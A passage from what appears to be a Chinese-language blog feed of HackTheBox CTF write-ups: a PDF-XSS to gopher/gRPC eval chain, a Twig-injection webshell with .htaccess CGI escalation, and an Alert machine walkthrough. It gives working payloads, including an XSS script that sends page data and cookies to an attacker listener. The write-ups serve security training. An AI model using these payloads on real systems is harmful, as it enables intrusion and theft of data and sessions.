href="http://127.0.0.1:1337/static/invoices/invoice_%7Bpayment_id%7D.pdf%22)%E4%B8%ADpaymentid%E5%8F%AF%E6%8E%A7%EF%BC%8C%E7%94%A8../%E5%8F%AF%E4%BB%A5%E8%BF%94%E5%9B%9E%E5%B9%B6%E4%B8%94%E8%AE%BF%E9%97%AEadmin%E8%B7%AF%E7%94%B1%E7%94%A8&a=%E6%9D%A5%E8%AE%A9'.pdf'%E6%88%90%E4%B8%BA%E6%97%A0%E6%84%8F%E4%B9%89%E7%9A%84%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E3%80%82%E8%BF%99%E4%B8%AA%E7%82%B9%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%BC%95%E5%AF%BCbot%E8%AE%BF%E9%97%AE/admin/view-pdf%E3%80%82%E6%B3%A8%E6%84%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E8%AE%BF%E9%97%AE%E5%B1%80%E9%99%90%E4%BA%8E127.0.0.1:1337,%E5%B9%B6%E4%B8%94%E9%80%9A%E8%BF%87bot%E8%AE%BF%E9%97%AE%E6%98%AF%E5%BF%85%E9%A1%BB%E7%9A%84%E7%8E%AF%E8%8A%82%EF%BC%8C%E5%90%A6%E5%88%99%E4%B8%8D%E4%BC%9A%E6%9C%89%E5%90%88%E6%B3%95session">http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf&quot;)中paymentid可控，用../可以返回并且访问admin路由用&amp;a=来让&#39;.pdf&#39;成为无意义的请求参数。这个点我们可以用来引导bot访问/admin/view-pdf。注意，这里的访问局限于127.0.0.1:1337,并且通过bot访问是必须的环节，否则不会有合法session</a></p><p>step4：<br>view-pdf可以访问任意url的pdf，注意，从上一步的浏览器请求到这一步，我们始终在浏览器中，看到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> send_file(pdf_data, mimetype=<span class="string">&quot;application/pdf&quot;</span>, as_attachment=<span class="literal">False</span>, download_name=<span class="string">&quot;document.pdf&quot;</span>)</span><br></pre></td></tr></table></figure><p>attachment&#x3D;false意味着浏览器会直接打开这个pdf，firefox在126版本一下存在一个pdf导致xss的CVE-2024-4367，dockerfile是125，所以可以利用pdf来触发xss，这个xss只有在firefox会被触发，并且必须是bot访问<br>有一些问题：不能用fetch或者xhr去发送cookie，因为httponly，所以不能以admin登录，另外也不能直接fetch &#x2F;admin下的路由，因为你会发现firefox viewpdf触发xss的时候document.domain&#x3D;pdf.js，所以你的fetch会被cors阻止发送cookie，无论你怎么设置fetch的参数。这意味着，我们只能使用form表单的，写个js自动提交到&#x2F;admin路由，这种情况是会自动发送cookie的，区别于fetch，因此，用pdf触发xss后我们就可以让admin访问以下的路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@web.route(<span class="params"><span class="string">&quot;/admin/api-health&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_health</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;loggedin&quot;</span>) <span class="keyword">or</span> session.get(<span class="string">&quot;role&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;admin_api_health.html&quot;</span>, title=<span class="string">&quot;Admin panel - API health&quot;</span>, session=session)</span><br><span class="line"></span><br><span class="line">url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;error.html&quot;</span>, title=<span class="string">&quot;Error&quot;</span>, error=<span class="string">&quot;Missing URL&quot;</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">status_code = get_url_status_code(url)</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;admin_api_health.html&quot;</span>, title=<span class="string">&quot;Admin panel - API health&quot;</span>, session=session, status_code=status_code)</span><br></pre></td></tr></table></figure><pre><code>为什么是这个路由？因为get_url_status_code(url)中调用了命令行的curl，向我们提供的url参数发起请求，这个是我们ssrf的关键步骤。为什么要绕一步不直接在</code></pre><p>view-pdf中让bot访问这个路由？注意，这个路由只接受post方法，要么fetch，要么form，只有xss做得到，其它的路由不存在我们控制bot以admin身份发送post到这个路由的能力。curl支持相当多的协议，其中就有大家都熟悉的gopher，利用gopher我们几乎就做出来这个题了。</p><pre><code>curl支持那么多协议，为什么只用gopher？直接file://行不行？这其实就是回显的问题，确实是可以访问的，但是我们看不到flag。想要在xss那一步用file://然后</code></pre><p>outofband也是不行的，会被浏览器阻止访问本地文件。<br>    话说回来，怎么用gopher打？实际上作者留了后面eval在product_api的api.py中，其中给了 UpdateService和GenerateProduct，思路就是利用UpdateService向<br>self注入一个price_formula属性，然后触发generateproduct方法，触发eval。<br>    这里需要了解以下grpc协议，这是一个基于http2的远程方法调用，有点像java的rmi，服务端根据product.proto编译生成了两个文件product_xxxxx.py，这两个文件<br>同时被放在client，为的就是client能够识别正确的类型信息，并且知道怎么把需要发送的参数和方法序列化到tcp字节流当中。服务端的api.py就是注册了一个提供方法的<br>服务，client创建stub后利用服务端的方法名和相应的参数去调用相对应的方法。客户端实际上已经育一些路由访问了这些方法，但是，我们的第一步必须是给服务端的product对象添加一个price_formula，然后用generateproduct去eval它。DebugService调用了updateservice，当然，也可以直接调用updateservice，不过这两个方法<br>都是内部方法，不存在哪个路由可以直接调用的，即使是admin的路由。我们只能通过gopher去调用它，generateproduct可以用之前的方法直接让bot访问&#x2F;admin&#x2F;product-stream触发。<br>    现在，如何构造合适的tcp数据流是关键所在，也是最后一步。并没有支持http2的gopher的现成工具，人工去计算http2的字段是很复杂的，比http1要复杂的多，对我们<br>没有什么帮助，还极其容易出错。一个比较好的办法是wireshark抓包，然后抓取client http2的数据流，转化为字节数组并且用%编码，或者本地用nc在某个端口监听，去抓取字节发出去的grpc数据报。这里注意，grpc的协议中client发送完整http2数据后，server会返回一个随机的字节流，client要重复发送回去这个字节流才能得到响应，<br>但是在client发送http2数据后相应方法已经执行。gopher协议我们只能发一次数据，我们不能，但是也不需要获取响应，我们只需要eval执行我们的命令，把flag拷贝到<br>可读的位置，也就是eval(‘<strong>import</strong>(“os”).system(“cp &#x2F;flag* &#x2F;app&#x2F;store&#x2F;application&#x2F;static&#x2F;flag.txt”)’),就完成了最后一步。生成的数据流被放在gopher后面</p><p>这个是不会变的，我已经写好放下面了（建议自己尝试生成）<br>gopher:&#x2F;&#x2F;<em>PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC</em>%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29    </p><p>这个peiload应该被放在pdf中的url字段，被作为curl的参数，我在文件夹中也放了生成pdf的py代码和我生成的pdf，这个pdf是不会变的，可以直接用，生成方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python genpdf.py <span class="string">&quot;var form=document.createElement(&#x27;form&#x27;);form.action=&#x27;http://127.0.0.1:1337/admin/api-health&#x27;;form.method=&#x27;post&#x27;;var urlInput=document.createElement(&#x27;input&#x27;);urlInput.value=&#x27;gopher://127.0.0.1:50051/_PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC_%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29&#x27;;urlInput.name=&#x27;url&#x27;;form.appendChild(urlInput);document.body.appendChild(form);form.submit();&quot;</span></span><br></pre></td></tr></table></figure><p>（(tip:some versions of curl dont support null bytes %00）</p><p>flag：HTB{ol4_t4_ch41n5_ol4_t4_ch41n5_l4mp0un_t4_d15m4nd14_4l1_day}</p>]]></content>
      
      
      <categories>
          
          <category> htb-challenge </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JerryTok-writeup</title>
      <link href="/2024/12/08/JerryTok/"/>
      <url>/2024/12/08/JerryTok/</url>
      
        <content type="html"><![CDATA[先看看附件，附件中的entrypoint.sh关掉了一堆可以执行命令的php函数，也禁止了putenv，没法劫持LD_PRELOAD再来看看web页面，location参数一个很明显的twig模板注入，用map过滤器可以执行php代码，但是一定得是两个参数的php函数，所以先写shell：http://192.168.205.128:1337/?location={{{%22%3C?php%20eval($_GET[0]);%22:%22test.php%22}|map(%27file_put_contents%27)}}得到test。php访问http://xxxxx:xxxx/test.php?0=echo+1就可以看到回显附件中flag在/root，www用户没权限进入，但是给了个setuid程序/readflag，setuid程序就是任意执行程序的用户都有程序所有者的权限，而这个readflag所有者是root，所以可以提权（作者的后门）php可访问的目录被局限在/www想办法获取执行程序的方法exec等等都不行，但是httpd.conf中allowoverride all启用了，所以可以覆盖.htaccess来让一定后缀的文件被当作cgi脚本，这个文件我们可以用file_put_contents写的，然后调用/bin/sh去执行我们的后门step1：http://xxxxx:xxxx/test.php?0=urlencode(payload1)payload1<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;Options ExecCGI\nAddHandler cgi-script .sh\n&quot;</span>);</span><br></pre></td></tr></table></figure>step2：http://xxxxx:xxxx/test.php?0=urlencode(payload2)payload2<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;exec.sh&quot;</span>,<span class="string">&quot;#!/bin/sh\n\necho &#x27;Content-Type: text/plain&#x27;\necho &#x27;&#x27;\n/readflag &gt; /www/public/res.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="string">&quot;exec.sh&quot;</span>,<span class="number">0777</span>);</span><br></pre></td></tr></table></figure>step3:http://xxxxx:xxxx/exec.shstep4:http://xxxxx:xxxx/res.txtHTB{byp4ss1ng_d1s4bl3d_fuNc7i0n5_and_0p3n_b4s3d1r_c4n_b3_s0_mund4n3}]]></content>
      
      
      <categories>
          
          <category> htb-challenge </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Alert-writeup</title>
      <link href="/2024/12/08/alert/"/>
      <url>/2024/12/08/alert/</url>
      
        <content type="html"><![CDATA[<p>HTB machine Alert workthrough:</p><p>step1:</p><p>在&#x2F;etc&#x2F;hosts 中添加<br>10.10.11.44 alert.htb<br>保证能够直接通过浏览器访问</p><p>step2：<br>访问alert.htb会发现可以上传一个markdown文件，服务器是对markdown有足够的校验的，如下(是ssh后才能读到源代码的，方便起见直接放出来)<br>index.php</p><p>route:  &#x2F;index.php?page&#x3D;alert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=alert&quot;</span>&gt;Markdown Viewer&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=contact&quot;</span>&gt;Contact Us&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=about&quot;</span>&gt;About Us&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=donate&quot;</span>&gt;Donate&lt;/a&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$ip</span> == <span class="string">&#x27;::1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?page=messages&quot;&gt;Messages&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])) </span>&#123;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$page</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;alert&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Markdown Viewer&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;visualizer.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; accept=&quot;.md&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;View Markdown&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">          &lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;contact&#x27;</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;status&#x27;</span>]) .</span><br><span class="line">      <span class="string">&#x27;  &lt;form action=&quot;contact.php&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;Your email&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;textarea name=&quot;message&quot; placeholder=&quot;Your message&quot; rows=&quot;4&quot; required&gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Send&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;about&#x27;</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;About Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;messages&#x27;</span>:</span><br><span class="line">                    <span class="keyword">require</span> <span class="string">&#x27;messages.php&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;donate&#x27;</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Support Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your donation helps improve Markdown visualization, providing a better user experience for everyone.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;form action=&quot;#&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;number&quot; name=&quot;amount&quot; placeholder=&quot;Enter amount&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;submit&quot; value=&quot;Donate&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;/form&gt;</span></span><br><span class="line"><span class="string">                          &lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Error: Page not found&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php?page=alert&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;footer&gt;</span><br><span class="line">        &lt;p style=<span class="string">&quot;color: black;&quot;</span>&gt;© <span class="number">2024</span> Alert. All rights reserved.&lt;/p&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是测试发现markdown文件包含script则能够在自己的浏览器上触发xss<br>step3：<br>route:  &#x2F;index.php?page&#x3D;contact<br>服务器不是直接包含.md文件，就是读进来而已，并且限制了文件的后缀和文件名中只能有一些合法的字符，这防止了.md的目录遍历<br>实际上黑盒测试中about页面已经提示你后台有个bot会看你的message，一猜就知道是xss，可以先在本地<code>nc -lnvp 1337</code>,然后发送<code>&lt;script&gt;location=&quot;http://10.10.xx.xx:1337&quot;</code>去测试<br>连通性，注意只能用你vpn主机的ip，不能用公共域名，否则收不到tcp连接，并且不需要填充后面的scrip标签，原因是你本地nc测试之后会发现后面的部分只是累赘，会被<br>html编码。</p><p>step4：<br>route:  &#x2F;visualizer.php?link_share&#x3D;xxxxxx, &#x2F;index.php?page&#x3D;contact<br>连通性测试完成后就想办法让admin去访问一个有xss的页面，为什么不直接在这里xss？因为这里html编码的问题，你自己去试试会发现payload极其难以调试，特<br>别是引号的闭合问题。实际上markdown文件是不会转义html标签的，其中就包括<code>&lt;script&gt;</code>,那么就可以通过重定向到markdown文件来xss，markdown会被编译之后返回回<br>来并且生成一个link_share&#x3D;xxx的公共链接，让admin去访问这个链接就可以执行完整的一个js代码。<br>贴一个python脚本：<br>这个脚本用于触发xss，只要修改你的a.md文件就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xss.py</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">&quot;http://alert.htb&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_mess</span>(<span class="params">a</span>):</span><br><span class="line">    email=<span class="string">&quot;a@qq.com&quot;</span></span><br><span class="line">    mes=(<span class="string">&quot;&lt;script&gt;location=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">    <span class="built_in">print</span>(mes)</span><br><span class="line">    r=requests.post(url+<span class="string">&quot;/contact.php&quot;</span>,data=&#123;<span class="string">&quot;email&quot;</span>:email,<span class="string">&quot;message&quot;</span>:mes&#125;,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.md&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res=requests.post(url+<span class="string">&quot;/visualizer.php&quot;</span>,files=&#123;<span class="string">&quot;file&quot;</span>:f&#125;</span><br><span class="line">    )</span><br><span class="line"><span class="built_in">print</span>(res.text)    </span><br><span class="line">soup=BeautifulSoup(res.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">a=soup.find_all(<span class="string">&quot;a&quot;</span>,href=<span class="literal">True</span>)[<span class="number">0</span>][<span class="string">&quot;href&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">send_mess(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a.md</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> readfile=<span class="string">&quot;http://alert.htb/index.php?page=messages&quot;</span>;<span class="comment">//改一下page就好</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(readfile)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;     </span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?data=&quot;</span> + <span class="built_in">encodeURIComponent</span>(data)+<span class="string">&quot;&amp;cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//改成你的ip,靶机可以直接和你的主机通信</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?err=&quot;</span>+error.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个用于接受admin的请求的python 服务器:(用nc也可以)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#server.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_from_directory, abort,request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_file</span>():</span><br><span class="line">    <span class="built_in">print</span>(request.args.get(<span class="string">&#x27;data&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;200&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行应用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>用法：先python server.py,然后python xss.py即可（修改 a.md）<br>step5:</p><p>有上面的想法后，先去尝试看看admin眼中的&#x2F;index.php，你就会发现有个<code>&lt;a 